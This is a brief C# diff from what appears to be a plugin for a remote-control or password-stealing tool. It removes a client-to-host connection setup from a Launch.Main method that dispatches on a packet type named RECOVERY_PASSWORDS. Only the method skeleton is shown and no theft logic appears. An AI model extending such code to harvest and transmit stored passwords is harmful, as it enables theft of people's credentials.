@@ -13,10 +13,7 @@ namespace Plugin
     public static class Launch
     {
         public static void Main(LoadingAPI loadingAPI)
-        {
-            ClientHandler clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key);
-            clientHandler.ConnectStart();
-       
+        {       
             switch (loadingAPI.currentPacket.packetType)
             {
                 case PacketType.RECOVERY_PASSWORDS:
